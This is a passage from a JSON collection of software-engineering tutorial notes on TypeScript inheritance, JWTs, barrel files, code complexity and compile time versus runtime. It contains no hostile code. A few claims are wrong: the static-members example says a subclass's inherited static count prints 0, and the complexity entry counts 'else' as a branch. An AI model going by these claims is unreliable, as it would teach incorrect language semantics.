}\n   }\n   \n   class MultiFunctionDevice extends Document implements Scannable {\n     scan(): void {\n       console.log('Scanning document...');\n     }\n   }\n   \n   const mfd = new MultiFunctionDevice();\n   mfd.print(); // Inherited from Document\n   mfd.scan();  // Implemented from Scannable\n   ```\n\n## Common Pitfalls\n\n- Forgetting to call `super()` in child constructor (causes runtime error)\n- Calling `super()` after using `this` in constructor (must be first)\n- Overriding parent methods without using same signature\n- Using `private` when `protected` is needed for inheritance\n- Creating deep inheritance hierarchies (prefer composition over inheritance)\n- Not marking base classes as `abstract` when they shouldn't be instantiated\n\n## Practical Applications\n\n- UI Component libraries (BaseComponent → Button, Input, Modal)\n- Error handling hierarchies (Error → ValidationError → EmailValidationError)\n- Database models (BaseModel → User, Product with common CRUD methods)\n- Game development (GameObject → Player, Enemy, NPC)\n- Authentication systems (BaseAuthProvider → GoogleAuth, GitHubAuth)\n\n## References\n\n- [TypeScript Handbook: Classes](https://www.typescriptlang.org/docs/handbook/2/classes.html)\n- [TypeScript Handbook: Inheritance](https://www.typescriptlang.org/docs/handbook/2/classes.html#extends-clauses)\n- [MDN: Inheritance in JavaScript](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Inheritance_and_the_prototype_chain)\n- [TypeScript Deep Dive: Classes](https://basarat.gitbook.io/typescript/future-javascript/classes)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Method Override Rules:**\n  ```typescript\n  class Base {\n    greet(name: string): string {\n      return `Hello, ${name}`;\n    }\n  }\n  \n  class Derived extends Base {\n    // ✅ Valid: Same signature\n    greet(name: string): string {\n      return `Hi, ${name}!`;\n    }\n    \n    // ❌ Error: Different signature not allowed\n    // greet(name: string, age: number): string { }\n  }\n  ```\n\n- **Constructor Parameter Properties (Shorthand):**\n  ```typescript\n  class Person {\n    // Traditional way\n    name: string;\n    age: number;\n    \n    constructor(name: string, age: number) {\n      this.name = name;\n      this.age = age;\n    }\n  }\n  \n  // Shorthand with access modifiers\n  class PersonShort {\n    constructor(public name: string, public age: number) {}\n    // Automatically creates and assigns properties\n  }\n  ```\n\n- **Polymorphism:**\n  ```typescript\n  abstract class PaymentMethod {\n    abstract processPayment(amount: number): void;\n  }\n  \n  class CreditCard extends PaymentMethod {\n    processPayment(amount: number): void {\n      console.log(`Charging $${amount} to credit card`);\n    }\n  }\n  \n  class PayPal extends PaymentMethod {\n    processPayment(amount: number): void {\n      console.log(`Processing $${amount} via PayPal`);\n    }\n  }\n  \n  function checkout(method: PaymentMethod, amount: number) {\n    method.processPayment(amount); // Works with any payment method\n  }\n  \n  checkout(new CreditCard(), 100);\n  checkout(new PayPal(), 50);\n  ```\n\n- **Composition vs Inheritance (Prefer Composition):**\n  ```typescript\n  // ❌ Inheritance can get complex\n  class FlyingSwimmingAnimal extends Animal { }\n  \n  // ✅ Composition is more flexible\n  interface Flyable {\n    fly(): void;\n  }\n  \n  interface Swimmable {\n    swim(): void;\n  }\n  \n  class Duck implements Flyable, Swimmable {\n    fly(): void { console.log('Flying...'); }\n    swim(): void { console.log('Swimming...'); }\n  }\n  ```\n\n- **Generic Classes with Inheritance:**\n  ```typescript\n  abstract class Repository<T> {\n    protected items: T[] = [];\n    \n    add(item: T): void {\n      this.items.push(item);\n    }\n    \n    abstract findById(id: number): T | undefined;\n  }\n  \n  interface User {\n    id: number;\n    name: string;\n  }\n  \n  class UserRepository extends Repository<User> {\n    findById(id: number): User | undefined {\n      return this.items.find(user => user.id === id);\n    }\n  }\n  ```\n\n- **Static Members and Inheritance:**\n  ```typescript\n  class Base {\n    static count = 0;\n    static increment(): void {\n      this.count++;\n    }\n  }\n  \n  class Derived extends Base {}\n  \n  Base.increment();\n  console.log(Base.count); // 1\n  console.log(Derived.count); // 0 (separate static members)\n  ```\n\n- **Mixins Pattern (Multiple Inheritance Alternative):**\n  ```typescript\n  type Constructor<T = {}> = new (...args: any[]) => T;\n  \n  function Timestamped<TBase extends Constructor>(Base: TBase) {\n    return class extends Base {\n      createdAt = new Date();\n    };\n  }\n  \n  function Tagged<TBase extends Constructor>(Base: TBase) {\n    return class extends Base {\n      tags: string[] = [];\n      addTag(tag: string) { this.tags.push(tag); }\n    };\n  }\n  \n  class User {\n    constructor(public name: string) {}\n  }\n  \n  const TaggedTimestampedUser = Tagged(Timestamped(User));\n  const user = new TaggedTimestampedUser('Alice');\n  user.addTag('admin');\n  console.log(user.createdAt);\n  ```\n\n- **Best Practices:**\n  - Favor composition over deep inheritance hierarchies (max 2-3 levels)\n  - Use abstract classes when you need shared implementation\n  - Use interfaces when you only need type contracts\n  - Mark classes `final` conceptually if they shouldn't be extended (use TypeScript ESLint rules)\n  - Keep the Liskov Substitution Principle in mind: child classes should be substitutable for parent classes"
    },
    {
      "id": "swe/misc/autheNtication/jwt",
      "title": "Jwt",
      "path": [
        "swe",
        "misc",
        "autheNtication",
        "jwt"
      ],
      "content": "qq# JWT Tokens: A Concise Overview\n\nJSON Web Tokens (JWTs) are a compact, URL-safe means of representing claims between two parties. They are widely used for authentication and authorization in web applications.\n\n## Key Points\n\n- **Structure:** JWTs consist of three parts: header, payload, and signature.\n- **Stateless:** JWTs are self-contained and do not require server-side session storage.\n- **Security:** The signature ensures integrity and authenticity, but not confidentiality.\n- **Transport:** JWTs are commonly transmitted via HTTP headers (e.g., `Authorization: Bearer <token>`).\n- **Expiration:** Tokens can include an expiration (`exp`) claim for automatic invalidation.\n\n## Step-by-Step Explanation & Examples\n\n1. **Creating a JWT (Node.js Example)**\n   ```js\n   const jwt = require('jsonwebtoken');\n   const token = jwt.sign({ userId: 123 }, 'secret', { expiresIn: '1h' });\n   ```\n\n2. **Decoding and Verifying a JWT**\n   ```js\n   const decoded = jwt.verify(token, 'secret');\n   console.log(decoded.userId); // 123\n   ```\n\n3. **JWT Structure**\n   ```\n   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.  // header (base64)\n   eyJ1c2VySWQiOjEyMywiZXhwIjoxNjAwMDAwMDB9.  // payload (base64)\n   SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c  // signature\n   ```\n\n## Common Pitfalls\n\n- **Storing Sensitive Data:** Never put secrets or passwords in the payload; JWTs are only base64-encoded, not encrypted.\n- **Token Expiry:** Failing to handle expired tokens can lead to security issues.\n- **Signature Verification:** Always verify the signature before trusting the token’s contents.\n- **Algorithm Confusion:** Be explicit about the signing algorithm to avoid vulnerabilities.\n\n## Practical Applications\n\n- Stateless authentication for APIs and web apps.\n- Authorization for protected routes and resources.\n- Single sign-on (SSO) implementations.\n\n## References\n\n- [JWT.io Introduction](https://jwt.io/introduction/)\n- [RFC 7519: JSON Web Token (JWT)](https://datatracker.ietf.org/doc/html/rfc7519)\n- [Auth0: JWT Best Practices](https://auth0.com/docs/secure/tokens/json-web-tokens)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Refresh Tokens:** Use long-lived refresh tokens to obtain new JWTs without re-authenticating.\n- **Token Revocation:** Implement blacklists or short expiration times to mitigate risks from stolen tokens.\n- **Custom Claims:** Add custom claims (e.g., roles, permissions) to support fine-grained authorization.\n- **JWK/JWS/JWE:** Explore related standards for key management and"
    },
    {
      "id": "swe/misc/barrel-files",
      "title": "Barrel Files: Complete Overview",
      "path": [
        "swe",
        "misc",
        "barrel-files"
      ],
      "content": "# Barrel Files: Complete Overview\n\nBarrel files are index files that re-export multiple modules from a directory, allowing imports from a single entry point instead of individual file paths. Instead of importing from many files (`./components/Button`, `./components/Card`), you import from one (`./components`). Think of it like a warehouse loading dock—instead of customers going to each shelf, everything ships from one central point.\n\n## Key Points\n\n- **Purpose:** Simplify imports by re-exporting from single file\n- **Common Name:** `index.js` or `index.ts`\n- **Syntax:** `export * from './module'` or `export { Thing } from './module'`\n- **Benefits:** Cleaner imports, easier refactoring\n- **Drawbacks:** Can hurt tree-shaking, bundle size\n\n## Basic Example\n\n### Without Barrel File\n\n```javascript\n// Directory structure\ncomponents/\n  ├── Button.jsx\n  ├── Card.jsx\n  └── Input.jsx\n\n// Imports (verbose)\nimport { Button } from './components/Button';\nimport { Card } from './components/Card';\nimport { Input } from './components/Input';\n```\n\n### With Barrel File\n\n```javascript\n// components/index.js (barrel file)\nexport * from './Button';\nexport * from './Card';\nexport * from './Input';\n\n// Or explicit exports\nexport { Button } from './Button';\nexport { Card } from './Card';\nexport { Input } from './Input';\n\n// Imports (cleaner)\nimport { Button, Card, Input } from './components';\n```\n\n## Common Patterns\n\n### Re-export All\n\n```javascript\n// utils/index.js\nexport * from './formatDate';\nexport * from './validateEmail';\nexport * from './debounce';\n\n// Usage\nimport { formatDate, validateEmail, debounce } from './utils';\n```\n\n### Selective Re-export\n\n```javascript\n// components/index.js\n// Only export public API\nexport { Button } from './Button';\nexport { Card } from './Card';\n// Don't export internal components\n// export { InternalHelper } from './InternalHelper'; ❌\n\n// Usage can only import exported items\nimport { Button } from './components';  // ✅\nimport { InternalHelper } from './components';  // ❌ Not exported\n```\n\n### Named Exports with Rename\n\n```javascript\n// api/index.js\nexport { fetchUsers as getUsers } from './users';\nexport { fetchPosts as getPosts } from './posts';\nexport { createUser } from './users';\n\n// Usage\nimport { getUsers, getPosts, createUser } from './api';\n```\n\n### Default Export Re-export\n\n```javascript\n// components/Button.jsx\nexport default function Button() {}\n\n// components/index.js\nexport { default as Button } from './Button';\nexport { default as Card } from './Card';\n\n// Usage\nimport { Button, Card } from './components';\n```\n\n## Real-World Example\n\n### Component Library\n\n```javascript\n// components/\n//   ├── Button/\n//   │   ├── Button.jsx\n//   │   ├── Button.styles.js\n//   │   └── index.js\n//   ├── Card/\n//   │   ├── Card.jsx\n//   │   └── index.js\n//   └── index.js (barrel)\n\n// components/Button/index.js\nexport { Button } from './Button';\nexport { buttonStyles } from './Button.styles';\n\n// components/Card/index.js\nexport { Card } from './Card';\n\n// components/index.js (main barrel)\nexport * from './Button';\nexport * from './Card';\n\n// Usage in app\nimport { Button, Card } from './components';\n```\n\n### API Layer\n\n```javascript\n// api/\n//   ├── users.js\n//   ├── posts.js\n//   ├── comments.js\n//   └── index.js\n\n// api/users.js\nexport const getUsers = async () => {};\nexport const getUserById = async (id) => {};\nexport const createUser = async (data) => {};\n\n// api/posts.js\nexport const getPosts = async () => {};\nexport const createPost = async (data) => {};\n\n// api/index.js\nexport * from './users';\nexport * from './posts';\nexport * from './comments';\n\n// Usage\nimport { getUsers, getPosts, createPost } from './api';\n```\n\n### Utils\n\n```javascript\n// utils/\n//   ├── string.js\n//   ├── number.js\n//   ├── date.js\n//   └── index.js\n\n// utils/string.js\nexport const capitalize = (str) => {};\nexport const slugify = (str) => {};\n\n// utils/number.js\nexport const formatCurrency = (num) => {};\nexport const clamp = (num, min, max) => {};\n\n// utils/index.js\nexport * from './string';\nexport * from './number';\nexport * from './date';\n\n// Usage\nimport { capitalize, formatCurrency, clamp } from './utils';\n```\n\n## Pros and Cons\n\n### Advantages\n\n```javascript\n// ✅ Cleaner imports\n// Without barrel\nimport { Button } from './components/Button/Button';\nimport { Card } from './components/Card/Card';\nimport { Modal } from './components/Modal/Modal';\n\n// With barrel\nimport { Button, Card, Modal } from './components';\n\n// ✅ Easier refactoring\n// Move Button.jsx to different folder\n// Only update barrel file, not all imports\n\n// ✅ Hide internal structure\n// Users don't need to know file organization\n\n// ✅ Public API control\n// Only export what should be public\n```\n\n### Disadvantages\n\n```javascript\n// ❌ Hurts tree-shaking\n// Import one thing, bundler sees barrel importing everything\nimport { Button } from './components';  // Entire barrel evaluated\n\n// Better for tree-shaking\nimport { Button } from './components/Button';\n\n// ❌ Circular dependency risk\n// components/index.js exports Button\n// Button imports Card\n// Card imports something from components/index.js\n// → Circular dependency\n\n// ❌ IDE performance\n// Large barrels slow autocomplete\n\n// ❌ Harder debugging\n// Stack traces point to barrel, not actual file\n```\n\n## Tree-Shaking Impact\n\n```javascript\n// Bad for tree-shaking\n// components/index.js\nexport * from './Button';      // 10KB\nexport * from './DataTable';   // 50KB\nexport * from './Chart';       // 100KB\n\n// App.js\nimport { Button } from './components';\n// Bundler might include all 160KB even though only Button used\n\n// Better: Direct imports when bundle size matters\nimport { Button } from './components/Button';\n// Only Button's 10KB included\n```\n\n### Modern Bundler Handling\n\n```javascript\n// Modern bundlers (Webpack 5, Vite, esbuild) handle better\n// But still safer to avoid barrels for large libraries\n\n// Safe barrel usage:\n// ✅ Small utils (each <5KB)\nexport * from './formatDate';\nexport * from './capitalize';\n\n// ❌ Large components\nexport * from './DataTable';  // 50KB component\nexport * from './Chart';      // 100KB component\n```\n\n## When to Use Barrel Files\n\n```javascript\n// ✅ Use barrels for:\n\n// 1. Small utility collections\n// utils/index.js\nexport * from './formatters';\nexport * from './validators';\n\n// 2. Closely related components\n// form/index.js\nexport { Input } from './Input';\nexport { Select } from './Select';\nexport { Checkbox } from './Checkbox';\n\n// 3. API layer\n// api/index.js\nexport * from './users';\nexport * from './posts';\n\n// 4. Internal packages (not public libraries)\n// Your app's components folder\n\n\n// ❌ Avoid barrels for:\n\n// 1. Large component libraries\n// Instead: Import directly or use tree-shakeable barrels\n\n// 2. Hot module replacement (HMR) critical paths\n// Barrels slow HMR\n\n// 3. Public npm packages\n// Users should control what they import\n```\n\n## Best Practices\n\n### Explicit Over Wildcard\n\n```javascript\n// ❌ Less clear what's exported\nexport * from './Button';\nexport * from './Card';\n\n// ✅ Explicit, clear public API\nexport { Button, IconButton } from './Button';\nexport { Card, CardHeader, CardBody } from './Card';\n```\n\n### Group by Feature\n\n```javascript\n// ✅ Good: Feature-based barrels\ncomponents/\n  ├── forms/\n  │   ├── Input.jsx\n  │   ├── Select.jsx\n  │   └── index.js (barrel for form components)\n  ├── layout/\n  │   ├── Header.jsx\n  │   ├── Footer.jsx\n  │   └── index.js (barrel for layout components)\n  └── index.js (main barrel)\n\n// Import by feature\nimport { Input, Select } from './components/forms';\nimport { Header, Footer } from './components/layout';\n\n// Or from main barrel\nimport { Input, Header } from './components';\n```\n\n### Avoid Deep Barrels\n\n```javascript\n// ❌ Too many barrel layers\ncomponents/index.js\n  └─> Button/index.js\n       └─> variants/index.js\n            └─> PrimaryButton.jsx\n\n// ✅ Flatter structure\ncomponents/index.js\n  └─> Button/Button.jsx\n  └─> Button/PrimaryButton.jsx\n```\n\n### Document Barrel Contents\n\n```javascript\n// components/index.js\n/**\n * Component barrel\n * \n * Basic UI components:\n * - Button, IconButton\n * - Card, CardHeader, CardBody\n * \n * Form components:\n * - Input, Select, Checkbox\n */\nexport { Button, IconButton } from './Button';\nexport { Card, CardHeader, CardBody } from './Card';\nexport { Input } from './Input';\nexport { Select } from './Select';\nexport { Checkbox } from './Checkbox';\n```\n\n## Alternative Approaches\n\n### Named Barrel Entries\n\n```javascript\n// Instead of index.js, use descriptive names\ncomponents/\n  ├── buttons.js\n  ├── forms.js\n  └── layout.js\n\n// Import from specific barrels\nimport { Button } from './components/buttons';\nimport { Input } from './components/forms';\n```\n\n### Path Aliases\n\n```javascript\n// jsconfig.json / tsconfig.json\n{\n  \"compilerOptions\": {\n    \"baseUrl\": \".\",\n    \"paths\": {\n      \"@components/*\": [\"src/components/*\"],\n      \"@utils/*\": [\"src/utils/*\"]\n    }\n  }\n}\n\n// No barrel needed\nimport { Button } from '@components/Button';\nimport { Card } from '@components/Card';\n```\n\n### Scoped Imports\n\n```javascript\n// Package exports (package.json)\n{\n  \"exports\": {\n    \"./components\": \"./src/components/index.js\",\n    \"./utils\": \"./src/utils/index.js\"\n  }\n}\n\n// Import from scopes\nimport { Button } from 'my-lib/components';\nimport { formatDate } from 'my-lib/utils';\n```\n\n## Migration Strategy\n\n```javascript\n// Step 1: Create barrel\n// components/index.js\nexport { Button } from './Button';\nexport { Card } from './Card';\n\n// Step 2: Update imports gradually\n// Old\nimport { Button } from './components/Button';\n\n// New\nimport { Button } from './components';\n\n// Step 3: Use codemod or find/replace\n// Find: from './components/Button'\n// Replace: from './components'\n```\n\n## References\n\n- [Barrel Files Discussion](https://github.com/facebook/create-react-app/issues/5636)\n- [Tree Shaking](https://webpack.js.org/guides/tree-shaking/)\n- [TypeScript Module Resolution](https://www.typescriptlang.org/docs/handbook/module-resolution.html)\n\n---\n\n## Summary\n\n**Barrel File:** `index.js` that re-exports modules from a directory.\n\n**Syntax:**\n```javascript\nexport * from './Module';\nexport { Thing } from './Module';\n```\n\n**Benefits:** Cleaner imports, easier refactoring, encapsulation.\n\n**Drawbacks:** Can hurt tree-shaking, bundle size, circular dependencies.\n\n**Use for:** Small utils, internal apps, feature groups.\n\n**Avoid for:** Large libraries, public packages, bundle-critical code.\n\n**Rule of thumb:** Use barrels in your app for convenience. Avoid in public npm packages for tree-shaking."
    },
    {
      "id": "swe/misc/code-complexity",
      "title": "Code Complexity: Complete Overview",
      "path": [
        "swe",
        "misc",
        "code-complexity"
      ],
      "content": "# Code Complexity: Complete Overview\n\nCode complexity measures how difficult code is to understand, test, and maintain, primarily through cyclomatic complexity (counting decision paths). A function with many `if`, `else`, `switch`, `for`, and `while` statements has high complexity. Think of it like navigating a city—a straight road is simple (low complexity), while a maze of intersecting streets with many turns is complex (high complexity).\n\n## Key Points\n\n- **Cyclomatic Complexity:** Counts independent paths through code\n- **Formula:** Complexity = branches + 1\n- **Good Target:** 1-10 (simple), avoid 15+ (too complex)\n- **Impacts:** Testability, maintainability, bug risk\n- **Tools:** ESLint, SonarQube, CodeClimate\n\n## Cyclomatic Complexity\n\n### Calculation\n\n```javascript\n// Complexity = 1 (no branches)\nfunction add(a, b) {\n  return a + b;\n}\n\n// Complexity = 2 (1 if = 1 branch)\nfunction isPositive(num) {\n  if (num > 0) {\n    return true;\n  }\n  return false;\n}\n\n// Complexity = 3 (2 branches)\nfunction checkAge(age) {\n  if (age < 18) {\n    return 'minor';\n  } else if (age < 65) {\n    return 'adult';\n  } else {\n    return 'senior';\n  }\n}\n\n// Complexity = 5 (4 branches)\nfunction validateUser(user) {\n  if (!user) return false;           // +1\n  if (!user.name) return false;       // +1\n  if (!user.email) return false;      // +1\n  if (user.age < 0) return false;     // +1\n  return true;\n}\n```\n\n### What Counts as a Branch\n\n```javascript\n// Each adds +1 to complexity:\nif (condition) {}           // +1\nelse if (condition) {}      // +1\nelse {}                     // +1\nfor (;;) {}                 // +1\nwhile (condition) {}        // +1\ndo {} while (condition)     // +1\ncase:                       // +1 per case\ncondition ? a : b           // +1\n&&                          // +1\n||                          // +1\ncatch                       // +1\n```\n\n## Complexity Ratings\n\n```\n1-5:   Simple (easy to test, low risk)\n6-10:  Moderate (acceptable, consider refactoring)\n11-20: Complex (hard to test, higher risk)\n21-50: Very complex (difficult to maintain)\n50+:   Extremely complex (refactor immediately)\n\nIndustry Standards:\nGoogle: Recommends < 10\nNASA: Critical software < 10, preferably < 5\nSonarQube: Major issue at 10+, critical at 15+\n```\n\n## Examples by Complexity\n\n### Low Complexity (Good)\n\n```javascript\n// Complexity = 3\nfunction getDiscount(price, isPremium) {\n  if (isPremium) {\n    return price * 0.2;\n  }\n  if (price > 100) {\n    return price * 0.1;\n  }\n  return 0;\n}\n\n// Complexity = 2\nfunction formatCurrency(amount) {\n  if (amount < 0) {\n    return `-$${Math.abs(amount)}`;\n  }\n  return `$${amount}`;\n}\n```\n\n### Medium Complexity (Acceptable)\n\n```javascript\n// Complexity = 8\nfunction calculateShipping(order) {\n  let cost = 0;\n  \n  if (order.isPremium) {                    // +1\n    return 0;\n  }\n  \n  if (order.weight > 50) {                  // +1\n    cost += 20;\n  } else if (order.weight > 20) {           // +1\n    cost += 10;\n  }\n  \n  if (order.isInternational) {              // +1\n    cost += 15;\n  }\n  \n  if (order.isExpress && !order.isPremium) { // +2 (&&)\n    cost *= 2;\n  }\n  \n  return cost;\n}\n```\n\n### High Complexity (Bad)\n\n```javascript\n// Complexity = 15+ (too complex!)\nfunction processOrder(order) {\n  if (!order) return null;                          // +1\n  \n  if (order.status === 'pending') {                 // +1\n    if (order.paymentMethod === 'card') {           // +1\n      if (order.amount > 1000) {                    // +1\n        if (verifyCard()) {                         // +1\n          if (checkFraud()) {                       // +1\n            // process...\n          } else {\n            // fraud detected\n          }\n        }\n      } else {\n        // small amount\n      }\n    } else if (order.paymentMethod === 'paypal') {  // +1\n      // paypal logic\n    }\n  } else if (order.status === 'shipped') {          // +1\n    // shipping logic\n  }\n  \n  // More branches...\n  return result;\n}\n```\n\n## Refactoring High Complexity\n\n### Extract Functions\n\n```javascript\n// Before: Complexity = 12\nfunction processPayment(order) {\n  if (!order) return null;\n  if (!order.amount) return null;\n  if (order.amount < 0) return null;\n  \n  if (order.type === 'card') {\n    if (validateCard(order.card)) {\n      if (checkBalance(order.card, order.amount)) {\n        return chargeCard(order);\n      }\n    }\n  } else if (order.type === 'paypal') {\n    if (validatePayPal(order.paypal)) {\n      return chargePayPal(order);\n    }\n  }\n  \n  return null;\n}\n\n// After: Complexity = 3 (per function)\nfunction processPayment(order) {\n  if (!isValidOrder(order)) return null;\n  \n  if (order.type === 'card') {\n    return processCardPayment(order);\n  }\n  \n  if (order.type === 'paypal') {\n    return processPayPalPayment(order);\n  }\n  \n  return null;\n}\n\nfunction isValidOrder(order) {\n  return order && order.amount && order.amount > 0;\n}\n\nfunction processCardPayment(order) {\n  if (!validateCard(order.card)) return null;\n  if (!checkBalance(order.card, order.amount)) return null;\n  return chargeCard(order);\n}\n```\n\n### Strategy Pattern\n\n```javascript\n// Before: High complexity with many conditionals\nfunction calculatePrice(type, base) {\n  if (type === 'premium') {\n    return base * 0.8;\n  } else if (type === 'standard') {\n    return base * 0.9;\n  } else if (type === 'basic') {\n    return base;\n  }\n}\n\n// After: Low complexity with strategy pattern\nconst pricingStrategies = {\n  premium: (base) => base * 0.8,\n  standard: (base) => base * 0.9,\n  basic: (base) => base\n};\n\nfunction calculatePrice(type, base) {\n  const strategy = pricingStrategies[type];\n  return strategy ? strategy(base) : base;\n}\n```\n\n### Early Returns\n\n```javascript\n// Before: Nested complexity = 5\nfunction validateUser(user) {\n  if (user) {\n    if (user.name) {\n      if (user.email) {\n        if (user.age >= 18) {\n          return true;\n        }\n      }\n    }\n  }\n  return false;\n}\n\n// After: Reduced complexity = 5 (flatter)\nfunction validateUser(user) {\n  if (!user) return false;\n  if (!user.name) return false;\n  if (!user.email) return false;\n  if (user.age < 18) return false;\n  return true;\n}\n```\n\n### Lookup Tables\n\n```javascript\n// Before: Complexity = 8\nfunction getStatusMessage(code) {\n  if (code === 200) return 'OK';\n  else if (code === 201) return 'Created';\n  else if (code === 400) return 'Bad Request';\n  else if (code === 401) return 'Unauthorized';\n  else if (code === 404) return 'Not Found';\n  else if (code === 500) return 'Server Error';\n  return 'Unknown';\n}\n\n// After: Complexity = 2\nconst STATUS_MESSAGES = {\n  200: 'OK',\n  201: 'Created',\n  400: 'Bad Request',\n  401: 'Unauthorized',\n  404: 'Not Found',\n  500: 'Server Error'\n};\n\nfunction getStatusMessage(code) {\n  return STATUS_MESSAGES[code] || 'Unknown';\n}\n```\n\n## Measuring Complexity\n\n### ESLint\n\n```javascript\n// .eslintrc.json\n{\n  \"rules\": {\n    \"complexity\": [\"error\", 10]  // Max complexity 10\n  }\n}\n\n// Triggers warning:\nfunction tooComplex() {\n  // 11+ branches\n}\n// ESLint: Function has complexity of 11. Maximum allowed is 10\n```\n\n### SonarQube\n\n```javascript\n// Analyzes entire codebase\n// Reports functions with high complexity\n// Suggests refactoring targets\n\n// Example output:\n// function processOrder(): Complexity 15 (should be <= 10)\n```\n\n### Programmatic Check\n\n```bash\n# Using complexity-report\nnpm install -g complexity-report\n\ncomplexity-report src/**/*.js\n\n# Output:\n# src/orders.js\n#   processOrder: 15 (high)\n#   validateOrder: 3 (good)\n```\n\n## Cognitive Complexity\n\n```javascript\n// Similar to cyclomatic but accounts for nesting\n\n// Low cyclomatic (4), high cognitive (harder to understand)\nfunction nestedLogic(x) {\n  if (x > 0) {              // +1 cyclomatic, +1 cognitive\n    if (x < 10) {           // +1 cyclomatic, +2 cognitive (nested)\n      if (x % 2 === 0) {    // +1 cyclomatic, +3 cognitive (nested deeper)\n        return true;\n      }\n    }\n  }\n  return false;\n}\n\n// Same cyclomatic (4), lower cognitive (easier to understand)\nfunction flatLogic(x) {\n  if (x <= 0) return false;     // +1 each\n  if (x >= 10) return false;\n  if (x % 2 !== 0) return false;\n  return true;\n}\n\n// Prefer flat over nested\n```\n\n## When Complexity is Acceptable\n\n```javascript\n// Complex domain logic may justify higher complexity\nfunction calculateTax(income, state, filingStatus, dependents) {\n  // Tax brackets have inherent complexity\n  // 10-15 complexity acceptable if well-tested\n  \n  if (state === 'CA') {\n    // California tax logic\n  } else if (state === 'NY') {\n    // New York tax logic\n  }\n  // More states...\n  \n  // Document why complexity is necessary\n}\n\n// Parser/compiler code often complex\nfunction parseExpression(tokens) {\n  // Grammar rules create branches\n  // Complexity 15-20 acceptable for parsers\n}\n```\n\n## Testing and Complexity\n\n```javascript\n// Complexity = paths to test\n// Complexity 10 = 10 test cases minimum\n\nfunction classify(age, income) {  // Complexity = 4\n  if (age < 18) return 'minor';         // Test 1\n  if (income < 30000) return 'low';     // Test 2\n  if (income < 100000) return 'middle'; // Test 3\n  return 'high';                        // Test 4\n}\n\n// Need 4 tests to cover all paths\ntest('minor', () => expect(classify(15, 50000)).toBe('minor'));\ntest('low income', () => expect(classify(25, 20000)).toBe('low'));\ntest('middle income', () => expect(classify(30, 50000)).toBe('middle'));\ntest('high income', () => expect(classify(40, 150000)).toBe('high'));\n```\n\n## Best Practices\n\n```javascript\n// ✅ Keep functions under 10 complexity\nfunction goodComplexity() {\n  // 5-8 branches maximum\n}\n\n// ✅ Extract complex logic\nfunction process(data) {\n  if (!validate(data)) return;  // Validation extracted\n  return transform(data);       // Transform extracted\n}\n\n// ✅ Use early returns\nfunction check(value) {\n  if (!value) return false;\n  if (value < 0) return false;\n  return true;\n}\n\n// ✅ Prefer lookup tables over conditionals\nconst actions = { create: createFn, update: updateFn };\nconst action = actions[type] || defaultFn;\n\n// ❌ Deeply nested conditions\nfunction bad() {\n  if (x) {\n    if (y) {\n      if (z) {\n        // Too deep\n      }\n    }\n  }\n}\n\n// ❌ Many else-if chains\nfunction bad(type) {\n  if (type === 'a') {}\n  else if (type === 'b') {}\n  else if (type === 'c') {}\n  // 10+ more cases\n}\n```\n\n## References\n\n- [Cyclomatic Complexity](https://en.wikipedia.org/wiki/Cyclomatic_complexity)\n- [ESLint Complexity Rule](https://eslint.org/docs/latest/rules/complexity)\n- [SonarQube Cognitive Complexity](https://www.sonarsource.com/resources/cognitive-complexity/)\n\n---\n\n## Summary\n\n**Complexity:** Measure of code's decision paths (branches).\n\n**Target Values:**\n- 1-5: Simple (ideal)\n- 6-10: Acceptable\n- 11-15: Refactor recommended\n- 15+: Refactor required\n\n**Reduces Complexity:**\n- Extract functions\n- Early returns\n- Lookup tables/objects\n- Strategy pattern\n- Guard clauses\n\n**Measurement:**\n```bash\neslint --rule 'complexity: [error, 10]'\n```\n\n**Rule of thumb:** Keep functions under 10 complexity. If higher, extract logic into smaller functions. Each function should do one thing well. Complexity = number of test cases needed."
    },
    {
      "id": "swe/misc/compile-vs-runtime",
      "title": "Compile Time vs Runtime: Complete Guide",
      "path": [
        "swe",
        "misc",
        "compile-vs-runtime"
      ],
      "content": "# Compile Time vs Runtime: Complete Guide\n\n## Overview\n\n**Compile time** refers to when source code is translated into executable code by a compiler, while **runtime** is when that executable code actually runs and executes instructions. Think of it like building vs. living in a house - compile time is the construction phase where blueprints become a physical structure, and runtime is when you actually move in and use the house.\n\nThis distinction affects error detection, performance optimization, memory allocation, and debugging strategies. Understanding when things happen during these phases helps you write more efficient code and debug issues faster.\n\n## Key Points\n\n1. **Error Detection Timing**: Compile-time errors (syntax, type mismatches) are caught before execution, while runtime errors (null references, array bounds) occur during execution.\n\n2. **Performance Impact**: Compile-time optimizations improve runtime performance without changing program behavior, while runtime decisions add execution overhead.\n\n3. **Memory Management**: Static allocation happens at compile time with fixed sizes, dynamic allocation occurs at runtime based on actual needs.\n\n4. **Type Safety**: Strongly-typed languages catch type errors at compile time, while weakly-typed languages defer checks to runtime.\n\n5. **Code Generation**: Compilers generate optimized machine code at compile time, interpreters translate and execute code simultaneously at runtime.\n\n6. **Debugging Scope**: Compile-time issues prevent program execution entirely, runtime issues require live debugging techniques.\n\n7. **Resource Planning**: Compile-time analysis enables predictable resource usage, runtime analysis adapts to actual execution patterns.\n\n## Step-by-Step Explanation\n\n### 1. Compile Time Phase\n\n```cpp\n// C++ Example - All checked at compile time\nint main() {\n    int arr[5];           // Size known at compile time\n    arr[10] = 42;         // Potential issue, but compiler may not catch\n    string s = 123;       // ERROR: Type mismatch caught at compile time\n    return 0;\n}\n```\n\n**What happens**: Compiler validates syntax, checks types, optimizes code, generates executable.\n\n### 2. Runtime Phase\n\n```python\n# Python Example - Many checks happen at runtime\ndef process_data(items):\n    total = 0\n    for item in items:\n        total += item.value    # AttributeError if item has no 'value' - runtime error\n    return total\n\n# This only fails when actually called with wrong data\nprocess_data([1, 2, 3])        # Runtime error: int has no attribute 'value'\n```\n\n**What happens**: OS loads executable, allocates memory, executes instructions, handles dynamic behavior.\n\n### 3. Hybrid Examples\n\n```java\n// Java - Mix of compile-time and runtime checks\npublic class Example {\n    public static void main(String[] args) {\n        List<String> names = new ArrayList<>();  // Generic type checked at compile time\n        names.add(\"Alice\");\n        names.add(42);          // Compile-time error: Cannot add int to List<String>\n        \n        String name = names.get(5);  // Runtime error: IndexOutOfBoundsException\n    }\n}\n```\n\n## Common Pitfalls\n\n**Assuming Compile-Time Safety Guarantees Runtime Safety**\n```cpp\nint* ptr = new int(42);\ndelete ptr;\n*ptr = 100;  // Compiles fine, crashes at 